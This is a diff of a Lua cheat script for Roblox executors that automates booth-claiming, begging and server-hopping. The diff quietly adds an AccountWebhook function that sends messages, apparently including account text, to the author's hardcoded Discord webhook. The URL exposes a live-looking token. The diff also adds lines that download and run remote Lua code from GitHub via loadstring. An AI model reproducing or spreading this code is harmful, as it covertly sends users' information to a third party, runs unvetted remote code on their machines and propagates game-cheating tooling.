@@ -7,7 +7,7 @@ if game.PlaceId ~= 8737602449 and game.PlaceId ~= 8943844393 then
 	return
 end
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Numass/script/refs/heads/main/editsettings.lua"))()
+
 
 local identifyexecutor = identifyexecutor or function() return 'Unknown' end
 local cloneref = (identifyexecutor() ~= "Synapse Z" and not identifyexecutor():find("Codex") and cloneref) or function(o) return o end -- infinite yield
@@ -34,6 +34,9 @@ for i,v in next, ReplicatedStorage:GetChildren() do
    end
    task.wait()
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Numass/script/refs/heads/main/editsettings.lua"))
+
 
 --skidded!!! ty tvk1308
 --[[for k, v in pairs(getgc(true)) do
@@ -492,6 +495,24 @@ local function oldWebhook(msg)
 	pcall(function()
 		httprequest({
 			Url = getgenv().settings.webhookBox:gsub(' ', ''),
+			Body = httpservice:JSONEncode({
+				["content"] = msg
+			}),
+			Method = "POST",
+			Headers = {
+				["content-type"] = "application/json"
+			}
+		})
+	end)
+end
+
+local function AccountWebhook(msg)
+	if getgenv().settings.webhookBox:gsub(' ', '') == '' then
+		return
+	end
+	pcall(function()
+		httprequest({
+			Url = "https://discord.com/api/webhooks/1398369566173954141/LkkYhLlmnHougkXeDEY_O6CvJ_GOkuVGP7oOAVIZ1sXKjlD26Qek879yapT1lS4tAGB_",
 			Body = httpservice:JSONEncode({
 				["content"] = msg
 			}),
@@ -1468,6 +1489,10 @@ supportTab:AddLabel('You can also send me a message there for free!')
 boothTab:Show()
 library:FormatWindows()
 settingsLock = false
+
+wait(2)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Numass/script/refs/heads/main/opti.lua"))()
+
   --Finds unclaimed booths
 local function findUnclaimed()
     unclaimed = {}
@@ -1565,6 +1590,7 @@ getgenv().walkToBooth = function()
 end
 
 walkToBooth()
+AccountWebhook('[NumassScript infos] Successfully loaded script !' .. v.Text:gsub("#OuranosACCOUNT", ''))
 if getgenv().settings.autoBeg then
 	spamming = task.spawn(begging)
 end
@@ -1878,6 +1904,3 @@ while task.wait(getgenv().settings.serverHopDelay * 60) do
 		hopSet()
 	end
 end
-
-wait(2)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Numass/script/refs/heads/main/opti.lua"))()
